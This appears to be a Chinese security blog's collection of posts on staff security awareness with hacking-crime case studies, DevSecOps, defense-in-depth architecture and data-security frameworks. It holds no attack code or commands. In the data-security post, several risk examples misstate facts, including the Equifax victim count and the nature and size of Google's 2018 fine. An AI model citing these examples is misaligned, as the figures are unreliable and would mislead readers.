谭登元同另一名黑客郎小龙侵入了多家P2P平台。他们两个分工明确，由谭登元非法侵入被害单位的网站，取得被害单位网站的后台管理系统权限，并将权限发送给郎小龙，郎小龙则用获取到的权限篡改网站投资客户的姓名、身份证号、资金记录、银行卡号等原始数据后登陆网站系统申请提现，骗取被害单位向郎小龙控制的多个账户转账。通过这样的手段，两人一共骗取人民币共计1572356.15元。 芝麻金融遭黑客袭击，投资者信息被大量泄露 P2P平台“芝麻金融”被曝出因黑客袭击造成了超过8000名投资者的信息被泄露。这些数据包括用户姓名、身份证号、手机号、邮箱、银行卡信息等，只需用人民币充值兑换积分，即可在论坛上将这些数据全部下载。 网银资金被盗信息泄露所致 犯罪嫌疑人通过非银行过失的非法途径盗取了受害人的银行账号、网银密码等相关信息后，通过网上银行窃取了客户的资金。还有一位客户是因接受了不法分子为其办理的银行卡，然后将钱存入此卡中，于是不法分子通过事先注册好的个人网上银行将其资金划走了。 网银账户16万被盗案，嫌犯通过病毒窃取密码 侦查员通过查询银行转账记录，查明被害人的两张信用卡被犯罪嫌疑人通过网上银行分11次转出人民币共计163014元。犯罪嫌疑人供述了经事先预谋，在淘宝网上利用发送照片之际，将携带木马程序的病毒植入被害人的电脑，进而获取了被害人的银行账号、密码和认证证书，同时修改了被害人的密码，盗取被害人银行账户内人民币的犯罪事实。 网银多出23条消费记录，3天内一万多元被转走 开封市民王先生的网上银行3天内被转走1万多元钱。一是王先生的密码设置没起到保密效果，二是他“至少有5种信息遭泄露”。“确实有个人信息泄露的可能。但我的网银绑定了手机，23条消费记录，我怎么连一条短信提醒都没收到？”王先生网上银行这23笔交易记录，短信提醒都被另外一个移动手机号码接到了。“王先生自己也能收到短信提醒，但都储存在短信保险箱里，不能即时看到。” 华夏银行一程序员给服务器植入病毒，盗700多万获刑十年半 利用职务便利，覃其胜在北京市朝阳区环球金融中心华夏银行开发中心内，将其编写的“计算机病毒程序”，植入华夏银行总行核心系统应用服务器。据调取操作的审计日志显示，2017年11月24日，异常程序每天0：10开始执行。异常程序可以把指定账户，在前一日22时30分至本日0时10分的成功交易，修改为失败。而覃其胜则通过自己掌握的华夏银行卡，多次跨行ATM机取款，从2016年11月11日起，总共发生了1358笔，金额合计717.9万元。 三、个人信息安全风险及防范个人信息安全风险防范策略，首先我们需要遵纪守法，规范办公，坚守自己的职业操守，其次我们需要主动学习安全知识，提升安全防范意识。 1.个人信息安全-遵纪守法国家相关法律法规： * 《中华人民共和国刑法》第二百八十五条规定，非法侵入计算机信息系统罪，处三年以下有期徒刑或者拘役； * 《中华人民共和国刑法》第二百五十三条规定，贩卖个人信息超过50条属于“情节严重”，需要追求其法律责任； * 《网络安全法》要求企业要明确网络责任人，出现安全事故，直接负责人需要承担责任并且接受法律处罚。 2.个人信息安全-网络安全* 仅使用公司提供的接入方式接入办公网 * 不能使用Wi-Fi万能钥匙 * 不要随意打开陌生邮件 * 不要随意点击陌生链接 * 不要使用公共场合WIFI * 浏览安全网站，左上角有绿色小锁 * 离开电脑前及时锁屏 * Windows系统及时打补丁 * 谨慎使用不明来历的U盘 * 使用正版软件，不使用来路不明的软件 * 安装终端安全防护软件 3.个人信息安全-账号密码安全* 自己的账号密码不能告诉任何人 * 公司员工账号密码不得在其他任何地方使用 * 不要使用公共电脑办公，比如网吧电脑 * 不要在不安全位置存放明文密码，比如Word * 不要用简单密码，容易被破解导致严重损失 * 密码长度至少为8位，密码至少包含三种字母形式：大写字母、小写字母、特殊字符、数字 4.个人信息安全-存储数据安全* 不要把重要内容保存在邮箱内 * 不要将涉及隐私的内容存在网站上 * 对于个人关键信息进行加密处理 * 删除文件时最好粉碎删除或者覆盖 * 小心处理废弃硬盘或二手电脑 * 不要贪图小便宜轻易泄露信息 * 填写信息前要看是否有必要 5.个人信息安全-防社工欺骗1.什么是社工？ * 社工即社会工程学，是一种通过人际交流的方式获得信息的非技术渗透手段 2.社工常见手段？ * 钓鱼邮件、骚扰电话、模拟伪装 3.如何应对社工？ * 不要轻易点击邮件中的链接，不要打开来历不明的邮件 * 对来源不明的邮件需要警惕,特别是中奖、密码重置、敏感新闻等； * 不要轻易填写个人及单位信息，尤其是工作账号和密码 * 不要轻易泄漏任何信息，黑客可以从信息中找到隐藏的有价值的信息 * 在相信任何人之前，先校验其真实的身份，哪怕是你的上司向你索取敏感信息","tags":["安全意识"],"categories":["攻防兼备企业安全实践"]},{"title":"软件开发安全生命周期DevSecOps安全方案","path":"/2020/01/09/secbook/devsecops-security-solution/","content":"大多数安全漏洞发生在应用程序层，NIST曾发布过调查数据，75%的安全漏洞发生在应用程序层，而非以往认为的网络层，足见软件安全性问题。 软件上线后面临巨额的漏洞修复成本，在软件发布甚至上线运营后频繁出现严重安全问题，则将不仅会给软件发布者产生巨额的公关和漏洞修复成本，还会使其自身的品牌口碑、公信力带来巨大损害。 误报问题是研发安全建设的关键痛点，现有研发安全商业工具的误报问题，是研发安全建设中的关键痛点，误报问题导致的直接结果，是来自一线研发人员的安全落地阻力。 研发团队负责开发交付、运维团队负责可用性保障、安全团队负责安全保障的方式完成IT业务的管理，导致安全、开发和运维部门业务目标相互独立、割裂，有时甚至是对立和冲突，最终导致安全风险的闭环管理时间周期长、成本高。 DevOps安全现状 一、DevOps项目中的SDL在DevOps项目持久交付和快速迭代中，SDL因为节奏缓慢很难被业务部门接受。安全团队需要提供可持续集成的安全工具，不断优化安全流程。 DevOps项目中的SDL问题 二、DevSecOps理念DevSecOps 是一种结合了开发 (Dev)、安全 (Sec) 和运维 (Ops) 的安全理念，旨在在整个软件开发生命周期中提高安全性。DevSecOps 的核心思想是将安全考虑融入整个软件开发过程中，在软件开发的早期阶段就要考虑安全问题，从而提高软件的安全性。 DevSecOps理念 三、DevSecOps安全技术流程DevSecOps，一种全新的安全理念与模式，从DecOps的概念延伸和演变而来，其核心理念为安全是整个IT团队（包括开发、运维及安全团队）每个人的责任，需要贯穿从开发到运营整个业务生命周期的每一个环节。 DevSecOps 主要通过自动化安全测试，安全评估，威胁建模和安全文化来保证在整个软件生命周期中提高安全性，并减少漏洞数量，保证应用程序和基础架构的安全性，并加快产品的发布速度。 DevSecOps安全技术流程 四、威胁建模和安全防御原则STRIDE威胁建模和对应措施STRIDE 是一种常用的威胁建模框架，它是由微软研究院开发的。STRIDE 是一种通用的威胁建模方法，它可以帮助开发人员和安全专家识别和评估潜在的安全威胁。 STRIDE 代表了六种威胁类型： 1Spoofing (伪装)：指攻击者冒充另一个实体来获取系统资源或敏感信息。包括 IP 地址伪装、用户名伪装等。 2Tampering (篡改)：指攻击者篡改系统数据或应用程序，导致系统或应用程序功能缺陷或数据丢失。 3Repudiation (否认)：指攻击者否认发起或参与了某一操作，如欺骗用户或系统。 4Information disclosure (信息泄露)：指攻击者非法获取系统中的敏感信息。 5Denial of service (拒绝服务)：指攻击者通过消耗系统资源等手段使系统无法提供正常服务。 6Elevation of privilege (特权提升)：指攻击者通过绕过系统安全控制来获取高权限，如提升用户权限或获取系统管理员权限。这种威胁通常是通过漏洞利用、暴力破解、社工攻击等手段实现的。 威胁类型 缓解措施 技术方案 仿冒(S) 认证 Kerberos认证 PKI系统如SSL &#x2F; TLS证书 数字签名 篡改(T) 完整性保护 访问控制 完整性校验 抵赖(R) 日志审计 强认证 安全日志、审计 信息泄露(I) 保密性 加密 访问控制列表 拒绝服务(D) 可用性 访问控制列表 过滤 热备份 权限提升(E) 授权认证 输入校验 用户组管理 访问控制列表 安全防御原则1最小攻击面原则: 限制系统的攻击面，使其尽量小，减少攻击者的攻击点。 2默认安全原则: 系统默认的状态应该是安全的，需要特殊权限才能改变安全状态。 3权限最小化原则: 仅给予用户或程序最少的权限，以防止滥用权限导致安全问题。 4纵深防御原则: 使用多层防御措施，从防火墙、入站过滤到应用层防护，有效阻止威胁的传播。 5失败安全原则: 将系统设计为在遇到安全问题时能够安全地失效而不会导致灾难性后果。 6不信任第三方系统原则: 对于第三方系统和服务采取假定不信任的态度，对其进行适当的安全限制和监控。 7业务隔离原则: 将不同的业务和数据隔离开来，防止一个业务的安全问题影响其他业务。 8公开设计原则: 将系统设计公开透明，方便安全专家和社区对其进行审查和安全评估。 9简化系统设计原则: 设计简单的系统，减少复杂性，降低攻击面。 10使用白名单原则: 采用白名单机制，只允许特定的行为和数据，阻止未知的威胁。 五、DevSecOps关键技术1. 实现交互式应用程序安全测试（IAST）技术交互式应用程序安全测试技术（IAST技术），英文为Interactive Application Security Test，是系统安全测试引擎工作的核心技术。IAST技术将会实现自动获取应用程序上下文的数据，并把这些信息同时提供给静态和动态工具，从而快速而又精确地查找出漏洞。 IAST技术在应用程序内部执行。当程序运行时，能够持续地监视与查找漏洞；面向方面的编程技术使得安全测试系统可以在程序运行时嵌入安全分析，分析内容包括提取上下文内容、数据流和控制流，访问程序运行时传递的值，通过这些有价值的信息，安全测试系统可以达到其它工具所不能企及的精确度。 2. 实现实时应用程序自我防护（RASP）技术实时应用程序自我防护（RASP）技术，英文为 Runtime Application Self-Protection，是一种新型应用安全保护技术。RASP技术将保护程序像疫苗一样注入到应用程序，并与应用程序融为一体，能实时检测和阻断安全攻击，使应用程序具备自我保护能力，当应用程序遇到特定漏洞和攻击时不需要人工干预就可以进行自动重新配置应对新的攻击。这意味着，RASP 运行在程序执行期间，使程序能够自我监控和识别有害的输入和行为。 RASP技术能够让应用程序具备自我保护能力，且拥有实时性。因为拥有应用程序的上下文，它不仅可以分析应用程序的行为也可以结合上下文对行为进行分析，而且这些能持续不断的进行分析，一旦发现有攻击行为能立刻进行响应和处理。","tags":["DevSecOps"],"categories":["攻防兼备企业安全实践"]},{"title":"全链路纵深防御安全方案","path":"/2020/01/08/secbook/defense-in-depth-security-solution/","content":"本文总结行业面临的安全风险和企业安全架构现状，并根据这些风险和威胁提出应对措施。 一、网络安全现状●全球化网络威胁不断深化 通过互联网攻击手段实施企业犯罪活动已经成为企业犯罪的重要手段，企业组织机构也成为网络犯罪分子的首选目标。各种利用互联网攻击技术进行偷盗、诈骗、敲诈等案件不断发生，围绕互联网的黑灰产业正以极快的速度蔓延且在各国之间相互渗透。“网络黑产从业人员”呈级数增长，利用黑客技术的案件数每年以超过30%的增速增长，规模也已高达千亿级别。 ●新技术带来更多安全挑战 云计算环境中多租户的东西向和南北向的隔离技术和虚拟化计算存储技术使得安全边界不断扩大。大数据成为核心资产的同时，数据泄露、滥用、丢失的问题更加严重。区块链、物联网（IoT）设备等新兴技术，随着爆出来的漏洞越多，安全问题越严峻。 ●传统安全问题依然不容忽视 网络攻击流程化、普及化，黑客门槛不断降低，各类分析、扫描、破解、攻击工具可以随意下载，漏洞利用方式越发简易。企业每天都接受到大量的刺探性侵扰信息，一旦发现安全隐患，可能被不同类型恶意分子反复利用，对其造成不可估量的破坏性影响。 二、面临的网络安全威胁常见网络安全威胁系统脆弱性 ●企业业务支撑系统存在安全漏洞，给病毒、DDOS、僵尸网络、蠕虫等侵入留下可乘之机，带来很大威胁； ●病毒木马的威胁，很多木马程序和密码嗅探程序等多种病毒不断更新换代对网上银行实施攻击，窃取用户信息，可以直接威胁网上银行安全，其用户上网终端如没有安装木马查杀工具，就很容易被染； ●移动企业信息风险，由于用户安全防范意识比较薄弱及很多软件存在安全隐患，可能会给用户造成损失； 外部攻击者 ●黑客攻击由原来的单一无目的攻击转变成为有组织目的性很强的团体攻击犯罪，在攻击中主要以经济利益为目的，采取针对性的集团化攻击方式； ●最有效的网络互联网攻击形式是DDOS攻击，常见的有SYN攻击、DNS放大攻击和应用层DDOS攻击； ●网络钓鱼诱骗企业用户误认为钓鱼网站属于安全网站，很容易将用户信息泄露，虽然政府、企业对此非常重视，但很多钓鱼网站建在境外，很难监管； 内部因素 ●因企业业务服务中信息系统与内部控制存在缺陷，也有不适当的操作和人工引发的信息安全风险。 管理制度策略 ●企业的外包服务有可能给服务机构带来数据泄密的风险； ●信息泄露，企业交易信息是通过网络传输的，有些业务交易平台在信息传输、使用、存储、销毁等环节未建立保护信息的有效机制，致使信息很容易出现泄露风险； 典型大额资损安全事件●美国多家大银行泄露了2400多万份企业及银行资料，涉及大量贷款和抵押贷款信息； ●Lazarus黑客组织长期针对银行SWIFT系统发动攻击，曾从孟加拉央行盗取8100万美元； ●Carbanak组织攻击全球30多个国家的100多个企业，盗走至少12亿美元； ●APT组织“黄金眼”伪装成合法的软件开发企业，通过恶意程序窃取交易信息，赚取非法超额利润； ●韩国最大虚拟货币交易平台Bithumb遭黑客入侵，价值约350亿韩元（3000万美元）的数字货币被盗； ●日本数字货币交易所Zaif发布声明，被黑客盗走三种数字货币，价值约合5967万美元； ●华夏银行一程序员给服务器植入病毒，盗700多万。黑客利用银行APP安全漏洞非法获利2800余万元； 三、企业网络纵深安全防护需求企业业务存在大量的对内和对外应用系统，各系统更新迭代速度较快，现阶段依靠上线前卡点、安全漏洞扫描、人工渗透测试和应急响应等措施来保障整个产品安全生命周期。为了进一步增强信息安全威胁防范水平，通过建立产品安全检测流程自动化、业务链路防护精细化、数据链路风险可视化，达到信息安全保证有效可信。 安全保障需求与设计预防&#x2F;检测&#x2F;响应数据泄漏事件、入侵事件、拒绝服务事件、漏洞事件、IT事件、账号盗用事件等相关信息安全事件，防止产生重大公司损失。 安全需求 需求说明 【企业合规】 信息系统安全等级保护 满足国家信息系统安全等级测评要求，通过在安全技术和安全管理上选用与安全等级相适应的安全控制来实现，验证信息系统具备相应安全保护能力 信息安全管理体系 满足信息安全管理体系要求，建立信息安全解决方案的整体规划，确保企业所有信息系统和业务的安全，并保持正常运作 【基础安全】 全局资产清单 必须按照对业务的关键程度、服务级别和连续性的要求对资产进行分类。应针对所有资产以及其用途，维护一份完整的关键业务资产清单，保持定期的更新 全局基线漏洞监控 网络设备&#x2F;物理主机&#x2F;虚机&#x2F;容器&#x2F;数据库&#x2F;中间件&#x2F;操作系统加固和基础控制措施 流量攻击防护 互联网入口被流量攻击打满阻塞风险，部署分布式拒绝服务（DDoS）攻击防御系统清洗流量，调用运营商阻断流量攻击 网络层防火墙 互联网入口&#x2F;企业专区网络边界，实施网络访问控制，默认拒绝策略，仅允许白名单内的端口访问 应用层防火墙 对线上全部应用系统启用WAF进行应用层安全漏洞防护 网络安全域隔离 维护详细的边界网络和企业专区网络隔离策略，严格的网络变更流程，持续监控机制 网络层入侵检测 互联网入口部署入侵检测防御系统，识别和阻断网络攻击 主机层入侵检测 所有主机统一接入主机安全软件保护，具备主机漏洞发现能力，恶意代码检测和防护能力，对进程、重要配置文件防护能力 【产品安全】 公网域名系统收敛 整理公网域名，联系业务方关闭或内网迁移不需要对外开放的公网域名，减少对外暴露的攻击面 应用系统常态检查 对测试&#x2F;线上&#x2F;公网系统进行常态化漏洞扫描 安全检查流程 遵守安全流程或卡点，公网新域名上线前需通过安全部门审核，确认无安全风险后才能解析到公网 安全开发培训 研发、测试等相关人员，需要主动参加安全培训和安全考试，确保具备相关的应用安全能力，所有研发必须遵守安全编码规范 白盒代码审计 对测试&#x2F;上线发布的服务进行自动化代码安全扫描，覆盖常见代码安全漏洞 黑盒漏洞扫描 对测试&#x2F;上线发布的服务进行自动化漏洞扫描，覆盖常见Web安全漏洞 开源软件安全 识别检查第三方开源应用、框架、组件的安全性，防止此类应用、框架、组件被爆出安全漏洞，造成上层业务应用也存在安全漏洞 安全渗透测试 对核心重要业务系统进行人工安全测试，渗透测试覆盖清单 应用接口安全 防止应用存在无认证、越权访问、无审批、无审计等安全问题 【数据安全】 特权账号管理风险 超级管理员&#x2F;Root&#x2F;大Key权限管理，系统化、流程化、规范化落地特权帐号的管理工作 操作日志审计风险 网络设备&#x2F;操作系统&#x2F;数据库&#x2F;堡垒机进行操作行为日志记录 日志远程集中存储 业务日志、应用日志、主机日志等缺乏记录、缺少字段、存储时长较短，需要完善且全部收集集中存储， 对包含敏感信息的日志进行脱敏处理 堡垒机使用和管理 堡垒机密码策略、权限管理，设置专用审计权限账户，系统日志审计、操作日志审计 数据运营和使用监控审计 运营后台，数据进行脱敏处理，进行操作审计，查询用户详情次数限制配额。人员变动，访问权限及时变更 代码和配置变更管控流程 任何线上代码或配置的变更，必须经过双人检查确认后，才能发布 核心数据范围 明确可导致资金损失的关键数据库清单，实施防丢失&#x2F;删除&#x2F;篡改&#x2F;泄漏安全措施 核心数据访问限制 建立拥有访问核心数据的应用和人员白名单，除此之外禁止直接访问核心数据库 核心数据完整性 对核心关键数据实施数据完整性校验，防止数据被篡改 数据安全存储 密钥&#x2F;隐私数据必须加密保存，且加密算法及密钥管理必须通过安全审核 数据请求与脱敏 对返回用户敏感和隐私信息的接口应进行数据脱敏处理，禁止单次查询返回100条以上敏感数据 数据传输安全 所有对外开放的WEB服务必须使用HTTPS防止数据被窃取 【业务链路安全】 业务对外接口范围 所有对外开放的业务接口建立白名单，包含名称、用途、负责人，防止未授权访问、防重放、防遍历、防参数篡改 业务风险防控 所有用户行为日志接入风控系统，保护账号安全、支付安全、营销活动防刷 账号登陆安全 防弱口令及撞库，防账号数据库泄露，异地登陆、连续错误登陆风控或锁定 账号注册安全 防垃圾账号注册，注册覆盖 账号逻辑安全 防账号找回逻辑缺陷重新绑定手机或邮箱缺陷 授权访问控制 越权查看修改其他用户信息，越权查看修改系统管理员权限，CSRF劫持授权 业务办理安全 防止请求篡改风险，订单ID篡改、手机号邮箱篡改、用户ID篡改 业务流程安全 防止手机号邮箱验证绕过，验证码绕过，身份验证绕过 验证码机制 防止验证码暴力破解、验证码重复使用、验证码回显、验证码自动识别 支付操作安全 防止支付金额篡改、订单数量篡改、重复支付 重要操作保护 操作资金，转账和大额购买等行为，需要二次验证 交易限额保护 设置单笔、单日的交易限额，防止大量恶意刷交易接口风险 四、企业纵深安全防护架构在本节概括了我们构建的安全防护能力，以下是我们的安全架构体系的概述 ： ●安全合规： 遵从不同国家和行业的合规性要求，全力打造值得客户信赖的服务；同时，积极参与行业安全标准的制定及推广，坚持合规即服务，建设和运行安全可靠的云生态环境。 ●基础安全：采用云科技提供的基础设施服务，采用安全功能完善，可满足最苛刻要求的物理安全、网络安全、设备安全的措施来保障安全运行环境。 ●服务安全：在安全开发流程上，实施 Microsoft 微软安全推广的业界最佳实践 SDL（软件安全开发生命周期），并结合企业级安全需求以及自身的产品研发流程，有效控制产品服务安全漏洞风险。 ●数据安全：拥有可靠的数据安全保护，通过数据安全策略管理、数据存储安全、数据传输安全、数据访问与操作日志审计，数据高可用、多副本冗余存储与定时全量备份，保证数据可用性、完整性与数据安全。 ●人员安全：在所有员工招聘前、招聘中、工作中和离职后，有效落实背景调查、保密协议、安全培训和最小访问权限策略。 网络安全架构图 安全合规 GDPR 通用数据保护条例 《通用数据保护条例》（General Data Protection Regulation，简称GDPR）为欧洲联盟的条例，前身是欧盟在1995年制定的《计算机数据保护法》。数据中心、管理体系、研发、 职能部门通过此项认证意味着我们在信息安全管理领域已经与国际标准对标，具有充分的信息安全风险识别和控制能力，可以为全球客户提供安全可靠的服务。 网络安全等级保护 公安部信息安全等级保护三级认证 《GB&#x2F;T 22239-2008 信息安全技术信息系统安全等级保护基本要求》简称安全等级保护，是中国国家标准化管理委员会发布的信息安全标准，是中华人民共和国信息安全保障的一项基本制度。等级根据信息系统的重要程度，从低到高分为 1 至 5 个等级，不同安全等级实施不同的保护策略和要求 基础安全 物理安全 电力供应，数据中心采用冗余的电力系统，主电源和备用电源具备相同的供电能力，且主电源发生故障后，会由备用发电机和带有冗余机制的电池组对设备进行供电，保障数据中心持续运行。 环境温度，均采用新风系统冷却保障服务器或其他设备在一个恒温的环境下运行，并对数据中心的温湿度进行精密电子监控，一旦发生告警立即采取对应措施，以防止设备过热，减少服务中断的可能。 火灾探测系统的传感器位于数据中心的天花板和底板下面，利用热、烟雾和水传感器实现。数据中心接受火灾预防及灭火演练培训。 网络安全 为确保系统的网络访问安全，系统需要采用的安全手段主要有：访问控制、防火墙、线路备份、证书认证、虚拟专用网络、入侵检测等。使用了多种手段实现网络传输安全。 网络访问控制 采用多层防御，以帮助保护网络边界面临的外部攻击。控制网络流量和边界，使用行业标准的防火墙和 ACL 技术对网络进行强制隔离，在公司网络中，只允许被授权的服务和协议传输，未经授权的数据包将被自动丢弃。 传输层安全 全站HTTPS，任何于云平台内的数据传输皆受256位密钥加密强度的保护，完全满足敏感数据加密传输需求。通过 HTTPS 协议，信息在终端端到云端实现加密传输。 DDOS安全防御 使用云负载均衡 IP 来抵御DDoS的攻击。能有效抵御所有各类基于网络层、传输层及应用层的DDoS攻击。 入侵检测 使用入侵检测技术，借助大数据分析，对成千上万的网络日志等信息进行自动分析处理与深度挖掘，对网络的安全状态进行分析评价，快速感知到网络中的异常事件与整体安全态势。 设备安全 服务端口 定期对服务器资产进行扫描，及时关闭非必要的端口及服务，保障对外权限最小化，过滤不安全的服务，降低安全隐患。安全人员定期进行弱口令检测，督促服务器运维人员提升密码复杂度，防范暴力破解。 访问控制 所有对服务器的访问必须通过堡垒机进⾏操作并进⾏审计。通过⽩名单来控制业务服务的访问来源，保证服务只有信任来源可以访问。 漏洞扫描 采用自动化的漏洞扫描工具定期进行服务器漏洞检测，由安全人员确认后第一时间通告给相关人员进行处理修复，且运维人员会定期进行系统补丁更新，有效保障服务器稳定运行。 服务安全 安全开发生命周期 在安全开发流程上，参照微软推广的业界最佳实践，软件安全开发周期（ Security Development Lifecycle）建立： 安全需求环节 安全团队根据功能需求文档进行安全需求分析，针对业务内容、业务流程、技术框架进行沟通，形成《安全需求分析建议》。 安全设计环节 安全团队根据项目特征，与测试人员沟通安全测试关键点，形成《安全测试建议》。 安全开发环节 安全团队编制各类编程语言的安全编码规范，避免开发人员写出不安全的代码；使用开发代码扫描工具并结合人工审核代码漏洞，对产品代码进行白盒、黑盒扫描。 系统发布环节 安全团队依据上述环节评价结果决定代码是否发布。对线上环境进行安全漏洞评估，使用安全评估系统扫描漏洞，对线上环境进行安全配置评估。 安全日志和监控 安全日志 收集分析保存安全日志追踪和记录发生在涉及安全对象上的事件。安全日志记录发生了哪些与安全有关的活动，谁对这个活动负责。安全日志关注包括身份认证、登录，权限授权、访问控制、特权用户操作、安全配置变更、对关键功能的访问等等。 安全事件监控和响应 安全事件监控主要包括安全事件的收集、安全事件的归并和过滤、安全事件标准化、安全事件显示和报表。通过安全事件监控整个组织内的 IT 资源，过滤并关联事件，迅速定位安全威胁，并为安全事件响应提供支持。 Web 应用安全 会话安全 会话安全采取如下措施： ●在每次认证后打开一个新的会话：即使已经有与用户关联的会话标示符，在用户认证成功之后仍要重新建立一个会话。 ●强制执行一个会话最大空闲时间：用于缩短那些未能及时注销的用户暴露在外的时间，减少了可供攻击者猜解的会话 ID 的平均数目。 ●强制执行一个会话最大生存周期：增加安全性和稳定性。只有在不超过会话 ID 最大生存周期的时候，才允许一个会话不用再次进行对用户的认证。通过进行重新认证，防止攻击者窃取会话信息。 API 服务认证 API 服务会对每个访问的请求进行身份验证，所以无论使用 HTTP 还是 HTTPS 协议提交请求，都需要在请求中包含签名（Signature）信息。通过使用Access Key ID和 Access Key Secret进行对称加密的方法来验证请求的发送者 身份。 Web 应用防火墙 应用服务通过云应用防火墙 WAF 防御 SQL 注入、XSS跨站脚本、Web 服务器漏洞、木马上传、非授权核心资源访问等 OWASP 常见攻击，避免您的网站资产数据泄露，保障网站的安全与可用性。 数据安全保证数据可用性、完整性与数据安全，依据数据安全生命周期，从数据创建、存储、使用、共享、归档至销毁，使用了数据分级、数据加密等措施，保障了数据的保密性、完整性、可用性、真实性、授权、认证和不可抵赖性。 数据分级 对所有企业数据提供全方位安全保护，根据存储与使用的数据，实施数据等级保护策略，按照数据价值和敏感度对数据进行等级划分，根据数据安全分级，有对应的保护策略和要求，对企业数据进行安全存储与保护。 数据加密 使用 AES-256 算法加密数据存储，使用 KMS 管理密钥，密钥定期轮换，一次一密高安全保证，数据通过 SSL&#x2F;TLS 协议加密传输，2048 位 RSA 密钥，为敏感数据提供可持续的信息保护，实现数据安全保护和控制，将安全技术嵌入至整个数据安全生命周期中，以保障数据安全属性。 数据访问权限 数据访问权限，经过严谨的身份认证、权限授权、访问控制、等安全控制。数据权限审计，支持权限审计，权限管理业务日志，保留完整审计信息。对关键业务数据访问使用多因素身份认证，并要求二次权限认证，以加强保护。 数据安全审计 提供详细的数据访问与操作日志审计，安全审计覆盖所有数据活动的详细跟踪记录。生成的结果报表使所有数据活动详细可见，如登录失败、权限升级、计划变更、非法访问、敏感数据访问等，这些行为是否合规一览无余并做到所有用户操作有踪可寻。 数据存储 应用数据存储在云中，云存储保护和备份机制在产品中得到有效使用，为用户提供了安全存储服务。对数据进行全面性备份和关键数据备份，采用多备份、异地备份等方式，保障数据的存储安全。 数据销毁 对企业客户提出账号注销申请、企业数据信息删除等需求，根据法律法规要求对账户相关数据以包括但不限于删除、匿名化等方式进行处理。所有数据删除及匿名化技术手段均符合行业通行标准及法律法规要求，均不可逆。 数据灾备及恢复 提供数据高可用、多副本冗余存储与定时全量备份。通过自动化运维平台，实时故障检测，保障核心应用不中断，系统恢复方便快捷，可进行自动伸缩扩容，在突发事件及自然灾害时，为可用性及可持续服务提供保障能力。 人员安全●新员工在雇用前，在法律允许的情况下对员工进行背景调查，确保该员工的录用符合公司的规章制度。 ●新员工必须签订劳动合同和保密协议，对员工在信息安全方面所应承担的责任和义务进行了规范。 ●上岗前安全意识培训，组织培训帮助新员工了解他们作为 员工对应的安全责任。 ●安全意识培训是在工作期间的持续教育过程，帮助员工理解他们在数据保护方面的责任。 ●员工在离开时，提醒其保密义务，离职前注销其所有账号并需归还所有硬件和软件资产（如电脑、工作文档等）。 ●最小权限访问策略：基于业务和操作需求控制，对其基础设施、应用程序和数据进行访问。遵循特权分离原则，代码更改和维护的任务将分割并分配给多个不同的团队。操作团队负责维护生产环境，包括代码部署；而工程团队只在开发和测试环境中开发特性和代码。这确保了多个员工都应将任何代码都投入到生产中。所有情况下，管理访问都基于最少特权的概念；将用户限制在其开发功能所需的最小权限集中。","categories":["攻防兼备企业安全实践"]},{"title":"数据安全保护体系","path":"/2020/01/07/secbook/data-security-protection-system/","content":"一、数据安全保护的重要性数据是企业发展的核心资产，能为企业提供市场调研、客户分析、竞争分析、市场营销等信息，帮助企业制定发展战略、制定规划。此外，数据还能为企业提供信息管理、统计分析、知识共享、沟通协助等，帮助企业提高效率、降低成本、提升竞争力。如果数据不能得到有效的保护，就可能会发生数据泄露、遗失、篡改等事件，造成严重的后果。数据泄露会导致公司商业机密、个人隐私、用户信任等的损失，并可能引发诉讼、处罚等法律责任。数据遗失会使公司无法正常运营，影响业务发展和客户关系。数据篡改可能导致公司决策失误、财务损失、信誉损失等，甚至危及公司的生存。 《网络安全法》要求网络运营者采取数据分类、重要数据备份和加密等措施，防止网络数据被窃取或篡改，加强对公民个人信息的保护，防止公民个人信息被非法获取、泄露或非法使用。《数据安全法》规定，未履行数据安全保护义务的， 责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照，对直接负责的主管人员和其他直接责任人员进行处罚。 二、数据安全面临的风险泄露风险敏感数据在未经授权的情况下被泄露出去，导致公司的商业机密、个人隐私等受到损害。 例如：2017 年，Equifax（美国信用评级机构）遭受黑客攻击，导致约 143 万美国人的个人信息泄露。这些信息包括姓名、生日、身份证号码、电话号码、邮箱地址、银行账户信息等。这起事件导致美国司法部对 Equifax 进行调查，并给 Equifax 带来了巨大的声誉损失。 遗失风险数据因为硬件故障、软件漏洞、人为原因等导致丢失，无法恢复。 例如：2017 年，英国航空公司遭受黑客攻击，导致机场延误和航班取消。攻击造成的影响包括网络中断、计算机系统故障、航班信息丢失等。这起事件不仅给英国航空公司带来了巨大的经济损失，也使得旅客对该公司的信任度大幅下降。 中断风险指信息系统因为技术故障、病毒攻击、网络中断等原因无法正常运行，导致业务中断。 例如：2017 年，微软的 Azure 云平台遭受 DDoS 攻击，导致多个区域的服务中断。这起事件造成的影响包括：部分客户无法访问公共网站、无法连接到数据库服务器、无法使用云服务等。微软在修复事件后表示，此次攻击的流量达到了历史新高，是迄今为止遇到的最大规模的 DDoS 攻击。 合规风险指公司的数据处理、储存、传输过程中未能遵守相关的法律法规，导致公司面临监管处罚、信誉损失等风险。 例如：2018 年，谷歌因未能遵守欧盟的隐私条例而被罚款 4.34 亿欧元。欧盟调查发现，谷歌在未经用户同意的情况下，将用户的个人数据用于广告目的。这起事件不仅给谷歌带来了巨额罚款，也使得谷歌在欧盟的信誉受到了损害。 三、数据安全保障体系框架1公司数据安全防护体系方案的目的、范围、有效期等信息。确定数据安全防护体系的目标和范围：明确保护的数据类型、数据所属的部门或业务流程、期望达到的安全水平等。 2数据安全政策：确定公司对数据安全的基本原则、要求、责任分配等方面的规定。确定数据安全责任人，明确数据安全责任人的职责，包括负责制定数据安全策略、审批数据安全相关的政策和流程、监督数据安全的实施情况等。 3数据安全管理体系：建立数据安全管理机构、流程、规范、培训、审计等制度，确保数据安全防护体系的有效运行。制定数据安全的政策和流程，包括数据分类、数据存储、数据备份、数据传输、数据加密等。 4数据安全风险评估：对公司的数据进行风险评估，识别公司所面临的主要数据安全风险。识别数据安全风险：分析数据的来源、流动路径、使用方式等，识别潜在的安全威胁。 5数据安全防护措施：根据风险评估结果，确定公司采取的数据安全防护措施，包括物理安全、逻辑安全、网络安全、系统安全等方面。部署数据安全防护技术：按照规划安装、配置、测试数据安全防护技术，确保其正常运行。 6数据安全应急响应：制定数据安全应急响应流程、联络机制、处置措施等，以应对数据安全事件的发生。 7数据安全培训与普及：开展数据安全培训课程，使员工掌握数据安全知识和技能，提高数据安全意识。建立数据安全培训制度，定期对员工进行数据安全意识培训，提高员工的数据安全意识。 8数据安全审计与监控：定期对数据安全防护体系进行审计，确保其有效运行；设置数据安全监控系统，及时发现和处理数据安全事件。 